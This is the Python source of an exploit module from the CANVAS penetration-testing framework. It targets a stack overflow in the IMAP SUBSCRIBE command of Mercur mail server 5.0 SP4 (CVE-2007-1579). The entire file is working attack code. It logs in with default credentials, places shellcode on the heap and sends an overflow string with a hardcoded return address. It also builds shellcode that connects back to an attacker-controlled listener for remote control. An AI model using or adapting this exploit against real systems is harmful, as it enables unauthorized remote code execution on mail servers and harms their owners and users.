#! /usr/bin/env python

#
# CANVAS  Exploit
#

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")


import os,getopt
import socket
from exploitutils import *


from tcpexploit import tcpexploit
import canvasengine
import time

NAME="Mercur Imap SUBSCRIBE stack overflow"
DESCRIPTION="A stack overflow in the SUBSCRIBE IMAP call allows for a post-auth compromise"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Mercur"
DOCUMENTATION["CVE Name"] = "CVE-2007-1579"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1579"
DOCUMENTATION['CVSS'] = 10.0

VERSION="1.0"


PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]


NOTES="""
It'd be good to find out what the default postmaster password is.
In order to test this, I just changed mine to "immunity"

You will have to enable an IMAP mailbox for this to work...default is pop3
"""

CHANGELOG="""

"""

    

    

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port=143
        self.host=""
        self.shellcode="\xcc" * 298
        #function expands tildas? :>
        self.badstring="\x00/\\ ~\r\n"
        self.searchbadstring="\x00/\\ ~\r\n"
        self.setVersions()
        self.version=1
        self.name=NAME
        self.user="Administrator"
        self.password="immunity"
        self.banner="" #set by login function
        #this is the default root directory
        self.root="C:\\Program Files\\atrium software\\MERCUR\\Mail\\"
        #domain
        self.domain="localdomain.com"
        return


    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        """
        Mercur reports back 5.00.14, but in the about message
        it says 5.0.15.0, which is 5.0 SP4
        """
        #call ebx in mcrfax .text
        self.versions[1]=("Mercur Imap 5.0 SP4",0x01d43a50)

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
    
    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        rawshellcode=self.createInjectToSelf(host, port)
        return self.createWin32SearchShellcode(host,port,rawshellcode=rawshellcode, subesp=1000)
    
    def get_domain(self):
        """
        Connect to port 25 to attempt to get the domain, if self.domain==""
        """
        self.log("Getting domain")
        if self.domain:
            self.log("Already have domain: %s"%self.domain)
            return
        
        self.log("Connecting to SMTP to get domain")
        self.s=self.gettcpsock()
        #smtpport=25
        try:
            self.s.connect((self.host, 25))
        except socket.error, msg:
            self.log("Could not connect")
            return False
        
        #read banner
        try:
            data=self.s.recv(1000)
        except:
            data=""
            self.log("No SMTP banner")
            return
        
        try:
            data=data.split(" ")[1]
            #now we have "mail.localdomain.com"
            data=".".join(data.split(".")[1:])
            #strip off the mail. and we should have localdomain.com!
            self.domain=data
            self.log("Using domain: %s"%self.domain)
        except:
            pass
        return 
            
    def test(self):
        """
        
        """
        self.getargs()
        try:
            ret=self.imap_login()
        except:
            print "Failed to login"
            return False
        
        if not ret:
            return False
        if "MERCUR" not in self.banner:
            self.log("Not MERCUR IMAP")
            return False
        if "5.00.14" in self.banner:
            self.log("Using version 1")
            self.version=1
            return 1

        return 0
    
    def getargs(self):
        self.log("Getting arguments")
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))        
        self.user=self.argsDict.get("user", self.user)
        self.password=self.argsDict.get("password", self.password)
        self.root=self.argsDict.get("root", self.root)
        self.domain=self.argsDict.get("domain", self.domain)
        return

    def imap_subscribe(self, mailbox):
        """
        Subscribes to a mailbox
        """
        self.log("Subscribing to mailbox of length %d"%len(mailbox))
        subscribestring="0002 SUBSCRIBE %s\r\n"%mailbox
        try:
            self.s.sendall(subscribestring)
        except:
            self.log("Could not send data")
            return False
        return True
        
        
    def run(self):
        self.getargs()
        
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        if self.version==0:
            self.test()
            if self.version==0:
                self.log("Automatic versioning failed.")
                self.setInfo("%s attacking %s:%d - done (failed - no autoversion!)"%(NAME,self.host,self.port))
                return 0
            self.log("We found Mercur Imap!")
            

        self.log("Attacking %s:%d"%(self.host,self.port))

        self.get_domain()
                    
        self.log("Domain to attack: %s"%self.domain)
        ret=self.imap_login()
        if not ret:
            self.log("Could not log in")
            return 0
        
        self.log("Sending shellcode across wire...")
        #first we connect and send our shellcode, but we don't close the connection!
        #this shoves our shellcode on the heap somewhere.
        shellcode_fd=self.gettcpsock()
        shellcode_fd.connect((self.host, self.port))
        shellcode_fd.sendall(self.shellcode)
        self.log("Shoved shellcode into heap!")
        
        sploitstring=self.makesploit()
        self.log("Sending: %s"%prettyprint(sploitstring))
        self.imap_subscribe(sploitstring)
        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
            return 1
        else:
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))            
        return 0
        
    def makesploit(self):
        """
        Construct the attack
        
        You can restart mercur imap over and over, nicely.
        Breakpoint at 00423010 perhaps to see it
        
        0040EAEA is some sort of string copy function that adds // and does some transcoding
        
        Total size appears to be 292 bytes, although we clobber some pointers at the end
        Overflow for eip happens at 292-len(basestring)
        
        On 0x01020304 we have ebx and esp pointing to us, ebx points to the very start of our string on the stack
        
        We'll get roughly 264 bytes of shellcode space
        
        """

        root=self.root
        domain=self.domain

        #user we logged in as. Postmaster logs in as "admin"
        if self.user=="postmaster":
            user="admin"
        else:
            user=self.user
            #we need to strip the domain off the user, if they specified a domain
            index=user.find("@")
            if index!=-1:
                user=user[:index]
            #Adminstrator@localdomain.com -> Administrator for our calculation below :>
        self.log("Domain: %s"%domain)
        #domain+user is the "local mailbox" in the Mercur GUI
        basestring=root+domain+"\\"+user+"\\"
        self.log("Basestring: %s"%basestring)
        self.log("Length of base string: %s"%len(basestring))
        geteip=self.versions[self.version][1]
        #shove the shellcode on the end here
        buflen=280
        
        tagbyte="\xfe"
        sploitstring="Q"*buflen 
        offset=292-len(basestring)
        self.log("Offset=%d"%offset)
        self.easychunk(offset,4,1000)
        self.log("Shellcode length: %d"%len(self.shellcode))
        
        #if len(self.shellcode)>offset:
        #    self.log("Shellcode length is greater than offset! %d>%d"%(len(self.shellcode), offset))
        #    return ""
        #throw shellcode on beginning of string
        #add debug int3 to start
        sploitstring=stroverwrite(sploitstring, self.encodedsearchcode, 0)

        #minisearchcode=self.mini_search_code(tagbyte, "ebx")
        #sploitstring=stroverwrite(sploitstring, minisearchcode, 1)
        sploitstring=stroverwrite(sploitstring, intel_order(geteip), offset)
        return sploitstring

    
if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
